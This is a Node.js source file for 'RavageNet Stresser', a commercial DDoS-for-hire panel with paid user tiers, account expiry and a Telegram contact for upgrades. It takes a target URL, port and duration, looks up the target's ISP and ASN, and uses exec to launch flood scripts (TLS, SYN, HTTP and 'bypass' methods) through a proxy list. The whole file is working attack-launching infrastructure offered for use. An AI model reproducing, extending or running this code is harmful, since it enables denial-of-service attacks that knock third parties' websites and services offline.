#!/usr/bin/env node

const crypto = require('crypto');
const fs = require('fs');
const readline = require('readline');
const path = require('path');
const axios = require('axios');
const { exec } = require('child_process');
const { URL } = require('url');
const { setTimeout } = require("timers");
// Paths
const databasePath = '/sdcard/duck/database.json';
const encryptedDbPath = './database.enc';
const backupPath = `${databasePath}.bak`;
const hashPath = './database.hash';

global.setTimeout = setTimeout;
let attackCounter = 0;  // Tambahkan ini di bagian awal skrip
let processList = [];

function ongoingAttack(target, method, durationInt) {
    processList.push({
        user: user.username,
        target: target,
        method: method,
        duration: durationInt,
        startTime: Date.now(),
    });
}

function pushOngoing(target, method, durationInt) {
  ongoingAttack(target, method, durationInt);
}

const secureKey = crypto.createHash('sha256').update('My$3cur3P@ssw0rd!').digest();// Kunci rahasia
const availableMethodsVIP = ['BROWSERS', 'HTTP', 'STORM', 'BYPASS', 'HTTPS', 'STRIKE', 'CIBI', 'MEDUSA', 'TLS', 'DESTROY', 'MIX', 'TLSV2', 'FLOOD', 'MIXSYN', 'XYN', 'GLORY', 'RAPID', 'HTTP-RAW', 'SILVER']

const availableMethodsBasic = ['MEDUSA', 'TLS', 'MIX', 'HTTP-RAW', 'FLOOD', 'DESTROY']

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

// Validasi integritas database
function validateDatabase() {
  if (!fs.existsSync(encryptedDbPath) || !fs.existsSync(hashPath)) {
    console.error('Database tidak ditemukan atau korup. Harap beli sistem yang asli!');
    process.exit(1);
  }

  const database = fs.readFileSync(encryptedDbPath, 'utf8');
  const savedHash = fs.readFileSync(hashPath, 'utf8');
  const computedHash = crypto.createHash('sha256').update(database).digest('hex');

  if (computedHash !== savedHash) {
    console.error('Database telah dimodifikasi tanpa izin! Sistem dihentikan.');
    process.exit(1);
  }
}

// Dekripsi database
function decryptDatabase() {
  const [iv, encrypted] = fs.readFileSync(encryptedDbPath, 'utf8').split(':');
  const decipher = crypto.createDecipheriv('aes-256-cbc', secureKey, Buffer.from(iv, 'hex'));
  const decrypted = Buffer.concat([decipher.update(Buffer.from(encrypted, 'hex')), decipher.final()]);
  return JSON.parse(decrypted.toString());
}

// Enkripsi database
function encryptDatabase(data) {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv('aes-256-cbc', secureKey, iv);
  const encrypted = Buffer.concat([cipher.update(JSON.stringify(data)), cipher.final()]);
  const encryptedData = `${iv.toString('hex')}:${encrypted.toString('hex')}`;

  // Simpan database terenkripsi
  fs.writeFileSync(encryptedDbPath, encryptedData);

  // Simpan hash untuk validasi integritas
  const hash = crypto.createHash('sha256').update(encryptedData).digest('hex');
  fs.writeFileSync(hashPath, hash);
}

// Baca database dengan validasi dan dekripsi
function readDatabase() {
  try {
    validateDatabase();
    return decryptDatabase();
  } catch (error) {
    console.error('Gagal membaca database:', error.message);

    // Backup database lama jika ada masalah
    if (fs.existsSync(databasePath)) {
      fs.copyFileSync(databasePath, backupPath);
      console.warn('Backup database lama telah dibuat...');
    }

    console.warn('Database akan di-reset.');
    fs.writeFileSync(databasePath, JSON.stringify([]), { mode: 0o666 });
    return [];
  }
}

// Simpan database
function writeDatabase(data) {
  try {
    if (!Array.isArray(data)) throw new Error('Data harus berupa array!');
    encryptDatabase(data);
  } catch (error) {
    console.error('Gagal menyimpan database:', error.message);
  }
}

async function validateTargetURL(target) {
  try {
    const parsing = new URL(target); // Validasi URL target
    return parsing.hostname;
  } catch (error) {
    throw new Error('Target harus berupa URL yang valid!');
  }
}

async function pushOngoing(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration });

  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}
// [========================================] //
function ongoingAttack() {
  console.log("\nONGOING ATTACKS\n");
  processList.forEach((process) => {
console.log(`Target: ${process.target}
Methods: ${process.methods}
Duration: ${process.duration} Seconds
Since: ${Math.floor((Date.now() - process.startTime) / 1000)} seconds ago\n`);
  });
}

// Hapus pengguna yang sudah expired
function removeExpiredUsers() {
  const users = readDatabase();
  const currentDate = new Date();

  const updatedUsers = users.filter(user => {
    if (user.expired !== 'Unlimited' && new Date(user.expired) <= currentDate) {
      console.log(`Pengguna "${user.username}" telah kedaluwarsa dan dihapus.`);
      return false;
    }
    return true;
  });

  writeDatabase(updatedUsers);
}

function updateStatusBar(user, activeAttacks) {
  const status = `RavageNet | ${user.username} | MaxCons ${activeAttacks}/${user.maxConcurrents} | VIP ${user.vip ? 'TRUE' : 'FALSE'}`;
  process.stdout.write(`\x1b]2;[\\] ${status} \x07`);
}

function addUser(currentUser, args) {
  if (currentUser.username !== 'owner') {
    console.log('Only the owner can add users!');
    return;
  }

  if (args.length < 6) {
    console.log('Usage: adduser <username> <password> <expired> <maxDuration> <maxConcurrents> <VIP true/false>');
    return;
  }

  const [username, password, expired, maxDuration, maxConcurrents, vip] = args;
  const users = readDatabase();

  if (users.some(u => u.username === username)) {
    console.log(`User "${username}" already exists!`);
    return;
  }

  const newUser = {
    username,
    password,
    expired: expired.toLowerCase() === 'unlimited' ? 'Unlimited' : expired,
    maxDuration: parseInt(maxDuration, 10),
    maxConcurrents: parseInt(maxConcurrents, 10),
    vip: vip.toLowerCase() === 'true',
    methods: vip.toLowerCase() === 'true' ? availableMethodsVIP : availableMethodsBasic
  };

  users.push(newUser);
  writeDatabase(users);

  console.log(`User "${username}" added successfully!
  Expired: ${newUser.expired}
  Max Duration: ${newUser.maxDuration} seconds
  Max Concurrents: ${newUser.maxConcurrents}
  VIP: ${newUser.vip}
  Methods: ${newUser.methods.join(', ')}`);
}

function delUser(currentUser) {
  if (currentUser.username !== 'owner') {
    console.log('Only the owner can delete users!');
    return;
  }

  const users = readDatabase();
  rl.question('Enter username to delete: ', (username) => {
    const updatedUsers = users.filter(u => u.username !== username);
    if (updatedUsers.length === users.length) {
      console.log('User not found!');
    } else {
      writeDatabase(updatedUsers);
      console.log(`User "${username}" deleted successfully!`);
    }
    rl.prompt();
  });
}

function myPlans(user) {
  console.log(`
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
USERNAME        : ${user.username}
VIP STATUS      : ${user.vip ? 'true' : 'false'}
EXPIRED DATE    : ${user.expired}
MAX DURATION    : ${user.maxDuration} seconds
MAX CONCURRENTS : ${user.maxConcurrents}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`);
}

function showMethods() {
  const RESET = '\033[0m';
  const BOLD = '\033[1m';
  const BRIGHT_BLUE ='\033[94m';
  console.log(`
${BOLD}NAME            ┃ DESCRIPTION LAYER 7 ${BRIGHT_BLUE}[METHODS] [URL] [PORT] [DURATION]${RESET} ${BOLD}   ┃ DURATION ${RESET}
━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━
ATOM            ┃ [BASIC] - Lightweight flood attack with fast response    ┃ 500
BROWSER         ┃ [BASIC] - Simple flood using simulated browser requests  ┃ 500
BYPASS          ┃ [BASIC] - Overcomes basic protection with ease           ┃ 500
FLOOD           ┃ [BASIC] - Reliable HTTP flood for consistent impact      ┃ 500
HTTP            ┃ [BASIC] - General HTTP-based flood attack                ┃ 500
KILL            ┃ [BASIC] - High-speed flood to overwhelm targets quickly  ┃ 500
MIX             ┃ [BASIC] - Versatile attack with mixed request methods    ┃ 500
RAW             ┃ [BASIC] - Sends raw HTTP requests for high efficiency    ┃ 500
TLS             ┃ [BASIC] - Targeted flood leveraging TLS handshake        ┃ 500
GLORY           ┃ [VIP]   - Premium attack, effective against high defenses┃ 500
MIXSYN          ┃ [VIP]   - Combined SYN and protocol attack for maximum   ┃ 500
R2              ┃ [VIP]   - Persistent attack to bypass strong defenses    ┃ 500
SILVER          ┃ [VIP]   - Advanced layer 7 attack with high throughput   ┃ 500
STRIKE          ┃ [VIP]   - Targeted strike attack for secure systems      ┃ 500
XYN             ┃ [VIP]   - Multi-vector attack with customizable payloads ┃ 500
ZWART           ┃ [VIP]   - High-precision flood attack with strong impact ┃ 500
  `);
}

async function handleMethodCommand(user, method, args) {
  const availableMethods = user.vip ? availableMethodsVIP : availableMethodsBasic;
 try {
  const hostname = await validateTargetURL(args[0]); // Validasi target dari args
} catch (error) {
  console.log(`Oops! ${error.message}`);
  return;
}

  if (!availableMethods.includes(method.toUpperCase())) {
    console.log(`Maaf methods ${method} tidak bisa anda gunakan, ingin up plans VIP? DM ME t.me/DxoneXX`);
    return;
  }

  if (args.length < 3) {
    console.log(`Example: ${method} <target> <port> <duration>
${method} https://example.com 443 120`);
    return;
  }

  const [target, port, duration] = args;
  const durationInt = parseInt(duration, 10);

  if (durationInt > user.maxDuration) {
    console.log(`The maximum allowed duration for your plan is ${user.maxDuration} seconds.`);
    return;
  }

  const activeAttacks = processList.filter(p => p.user === user.username).length;
if (activeAttacks >= user.maxConcurrents) {
    console.log(`Anda telah mencapai jumlah serangan bersamaan maksimum (${user.maxConcurrents}). Tunggu serangan selesai.`);
    return;
}
function getTimeStamp() {
  const date = new Date();
  const month = date.toLocaleString('en-US', { month: 'short' });
  const day = date.toLocaleString('en-US', { day: '2-digit' });
  const year = date.getFullYear();
  return `${month}/${day}/${year}`;
}

  try {
    const parsing = new URL(target);
    const hostname = parsing.hostname;
    const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as,country,org,ip`);
    const result = scrape.data;

    const timeStamp = getTimeStamp(); // Tambahkan ini

BLUE='\033[34m';
RED='\033[31m';
GREEN='\033[32m';
BRIGHT_BLUE='\033[94m';
SOFT_BLUE = '\033[94m';
BRIGHT_BLUE ='\033[94m';
BRIGHT_WHITE = '\033[97m';
LIGHT_PURPLE = '\033[35m';  
SOFT_CYAN = '\033[96m';
BRIGHT_PURPLE='\033[95m';
WHITE='\033[97m';
BOLD='\033[1m';
RESET='\033[0m';
    console.log(`
${BOLD}  
${BRIGHT_WHITE}[ ${BRIGHT_WHITE}STRESSER SYSTEM ] ${BRIGHT_BLUE}Attack Successfully Executed!!
${BRIGHT_WHITE}| ( Host     )  ${SOFT_CYAN}${target}
${BRIGHT_WHITE}| ( Port     )  ${SOFT_CYAN}${port}
${BRIGHT_WHITE}| ( Methods  )  ${SOFT_CYAN}${method}
${BRIGHT_WHITE}| ( Duration )  ${SOFT_CYAN}${duration}
${BRIGHT_WHITE}| ( SentOn   )  ${SOFT_CYAN}${timeStamp}
${BRIGHT_WHITE}[ ${BRIGHT_WHITE}STRESSER SYSTEM ] ${SOFT_BLUE}Target Information >>
${BRIGHT_WHITE}| ( ISP      )  ${SOFT_CYAN}${result.isp}
${BRIGHT_WHITE}| ( ORG      )  ${SOFT_CYAN}${result.org}
${BRIGHT_WHITE}| ( ASN      )  ${SOFT_CYAN}${result.as}
${BRIGHT_WHITE}| ( COUNTRY  )  ${SOFT_CYAN}${result.country}
${BRIGHT_WHITE}[ ${BRIGHT_WHITE}STRESSER SYSTEM ] ${SOFT_BLUE}Powered By RavageNet Stresser
${BRIGHT_WHITE}[ ${BRIGHT_WHITE}STRESSER SYSTEM ] ${SOFT_BLUE}Type "cls" To Clear The Console Terminal
    ${RESET}`);

    const metode = path.join(__dirname, `/lib/cache/${method}.js`);

    if (method === 'FLOOD') {
      pushOngoing(target, method, durationInt);
      exec(`node ${metode} ${target} ${durationInt} 100 10 proxy.txt`);
      } else if (method === 'GLORY') {
      pushOngoing(target, method, durationInt);
      exec(`node ${metode} ${target} ${durationInt} 64 5 proxy.txt`);
      } else if (method === 'BROWSERS') {
      pushOngoing(target, method, durationInt);
      exec(`node ${metode} ${target} ${durationInt} 4 100`);
      } else if (method === 'CIBI') {
      pushOngoing(target, method, durationInt);
      exec(`node ${metode} ${target} ${durationInt} 100 10 proxy.txt`);
      } else if (method === 'BYPASS') {
      pushOngoing(target, method, durationInt);
      exec(`node ${metode} ${target} ${durationInt} 100 10 proxy.txt`);
      } else if (method === 'SILVER') {
      pushOngoing(target, method, durationInt);
      exec(`node ${metode} ${target} ${durationInt} 80 10 proxy.txt`);
      } else if (method === 'GLORY') {
      pushOngoing(target, method, durationInt);
      exec(`node ${metode} ${target} ${durationInt} 64 10 proxy.txt`);
      } else if (method === 'STRIKE') {
      pushOngoing(target, method, durationInt);
      exec(`node ${metode} GET ${target} ${durationInt} 10 90 proxy.txt --full`);
      } else if (method === 'TLSV2') {
      pushOngoing(target, method, durationInt);
      exec(`node ${metode} ${target} ${durationInt} 100 10`);
      } else if (method === 'RAPID') {
      pushOngoing(target, method, durationInt);
      exec(`node ${metode} ${target} ${durationInt} 80 10 proxy.txt`);
      } else if (method === 'TLS') {
      pushOngoing(target, method, durationInt);
      exec(`node ${metode} ${target} ${durationInt} 64 10`);
      } else if (method === 'HTTPS') {
      pushOngoing(target, method, durationInt);
      exec(`node ${metode} ${target} ${durationInt} 100 10 proxy.txt`);
      } else if (method === 'STORM') {
      pushOngoing(target, method, durationInt);
      exec(`node ${metode} ${target} ${durationInt} 100 10 proxy.txt`);
      } else if (method === 'MEDUSA') {
      pushOngoing(target, method, durationInt);
      exec(`node ${metode} ${target} ${durationInt} 100 10 proxy.txt`);
      } else if (method === 'DESTROY') {
      pushOngoing(target, method, durationInt);
      exec(`node ${metode} ${target} ${durationInt} 100 10 proxy.txt`);
      } else if (method === 'HTTP-RAW') {
      pushOngoing(target, method, durationInt);
      exec(`node ${metode} ${target} ${durationInt}`);
      } else if (method === 'MIX') {
      pushOngoing(target, method, durationInt);
      exec(`node ${metode} ${target} ${durationInt} 100 10 proxy.txt`);
      } else if (method === 'HTTP') {
      pushOngoing(target, method, durationInt);
      exec(`node ${metode} ${target} ${durationInt} 80 10 proxy.txt`);
      } else if (method === 'MIXSYN') {
      pushOngoing(target, method, durationInt);
      exec(`node ${metode} ${target} 10 ${durationInt}`);
      } else if (method === 'XYN') {
      pushOngoing(target, method, durationInt);
      exec(`node ${metode} ${target} ${durationInt} 64 15 proxy.txt`);
    }

    attackCounter++;
    const newActiveAttacks = processList.filter(p => p.user === user.username).length;
    updateStatusBar(user, newActiveAttacks);
  } catch (error) {
    console.log('Oops! Something went wrong:', error.message);
  }
}

async function login() {
  const users = readDatabase();
  return new Promise((resolve) => {
    rl.question('Username: ', (username) => {
      const user = users.find(u => u.username === username);
      if (!user) {
        console.log('Invalid username!');
        return resolve(false);
      }
      rl.question('Password: ', (password) => {
        if (user.password === password) {
          if (user.expired !== 'Unlimited' && new Date(user.expired) <= new Date()) {
            console.log('Your account has expired.');
            return resolve(false);
          }
          console.log(`Welcome back, ${username}!`);
          resolve(user);
        } else {
          console.log('Invalid password!');
          resolve(false);
        }
      });
    });
  });
}

function cls() {
  console.clear();
  const PURPLE_TEXT = "\x1b[35m";
  const WHITE_BG = "\x1b[47m";  // Background putih
  const BLACK_TEXT = "\x1b[30m"; // Teks hitam
  const DARK_PURPLE_TEXT = "\x1b[38;5;54m";
  const RESET = "\x1b[0m"; // Reset
  const BOLD = '\033[1m';
  const BRIGHT_WHITE = '\033[97m';   // Putih cerah dan elegan
  const SOFT_BLUE = '\033[94m';      // Biru muda yang lembut dan cerah
  const BRIGHT_BLUE ='\033[94m';
  const LIGHT_PURPLE = '\033[35m';   // Ungu muda yang memberi kesan mewah
  const SOFT_CYAN = '\033[96m';      // Cyan yang halus dan segar

  console.log(`
${BOLD}${BRIGHT_WHITE}    ____                               _   __     __     _____ __${RESET}                                   
${BOLD}${SOFT_BLUE}   / __ \\____ __   ______ _____ ____  / | / /__  / /_   / ___// /_________  _____________  _____${RESET}    
${BOLD}${LIGHT_PURPLE}  / /_/ / __ \`/ | / / __ \`/ __ \`/ _ \\/  |/ / _ \\/ __/   \\__ \\/ __/ ___/ _ \\/ ___/ ___/ _ \\/ ___/${RESET}    
${BOLD}${SOFT_CYAN} / _, _/ /_/ /| |/ / /_/ / /_/ /  __/ /|  /  __/ /_    ___/ / /_/ /  /  __(__  |__  )  __/ /   ${RESET}     
${BOLD}${SOFT_BLUE}/_/ |_|\\__,_/ |___/\\__,_/\\__, /\\___/_/ |_|\\___/\\__/   /____/\\__/_/   \\___/____/____/\\___/_/${RESET}         
${BOLD}${SOFT_CYAN}                        /____/                                                                       ${RESET}

${BOLD} Welcome to RavageNet Stresser, Enjoy The Available Features And Use Them Well. ${RESET}

 ${BOLD}Author${RESET} ${BOLD}: DxoneXmoonS
 Telegram :${RESET} https://t.me/DxoneXX${RESET}
 
 ${BOLD}${SOFT_CYAN}Please Commands "${LIGHT_PURPLE}myplans${SOFT_CYAN}" To View Your Plans Information
 Please Commands "${LIGHT_PURPLE}help${SOFT_CYAN}" To See Available Menu Features${RESET}
 
${BRIGHT_BLUE}${BOLD} - Powered By RavageNet Stresser
 - Copyright © 2024 - 2025 DxoneXmoonS All Right reserved
 
${LIGHT_PURPLE}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}`);
}

async function main() {
  removeExpiredUsers();
  const user = await login();
  if (!user) process.exit();

  cls();

  // Update Status Bar dengan jumlah serangan aktif 0 pada saat login
  updateStatusBar(user, 0);

  const prompt = () => {
    rl.question('RavageNet@Stresser:~# ', async (input) => {
        const [command, ...args] = input.trim().split(/\s+/);
        const normalizedCommand = command.toLowerCase();

      if (availableMethodsVIP.includes(command.toUpperCase()) || availableMethodsBasic.includes(command.toUpperCase())) {
        // Tunggu hingga handleMethodCommand selesai
        await handleMethodCommand(user, command.toUpperCase(), args);

        // Update Status Bar setiap ada serangan baru
        const activeAttacks = processList.filter(p => p.user === user.username).length;
        updateStatusBar(user, activeAttacks);
      } else {
        switch (normalizedCommand) {
          case 'help':
            const BOLD = '\033[1m';
              const RESET = '\033[0m';
            console.log(`
                                                Commands
${BOLD}NAME       ┃ ALIAS        ┃ DESCRIPTION${RESET}
━━━━━━━━━━━╋━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
methods    ┃ ----         ┃ Display a list of all available DDoS attack methods.
ongoing    ┃ ----         ┃ View a history of ongoing and completed attacks.
myplans    ┃ plans,subs   ┃ Show details about your current plan and its expiration.
adduser    ┃ add          ┃ Add a new user to the system with specified privileges.
deluser    ┃ remove       ┃ Remove a user from the system and revoke their access.
clear      ┃ cls,c        ┃ Clear the terminal screen for improved readability.
exit       ┃ quit,bye     ┃ End your session and log out of the system.
`);
            break;
          case 'methods':
            showMethods();
            break;
          case 'myplans':
            myPlans(user);
            break;
          case 'ongoing':
            ongoingAttack();

            // Update Status Bar setelah menampilkan ongoing attacks
            const activeAttacks = processList.filter(p => p.user === user.username).length;
            updateStatusBar(user, activeAttacks);
            break;
          case 'adduser':
            addUser(user, args);
            break;
          case 'exit':
          console.log('Exiting...');
           rl.close();  // Menutup readline
           return; // Menghentikan eksekusi fungsi prompt
            break;
          case 'deluser':
            delUser(user);
            break;
          case 'cls':
            cls();
            break;
          default:
            console.log('NOT FOUND');
        }
      }

      prompt();
    });
  };

  prompt();
}

main();
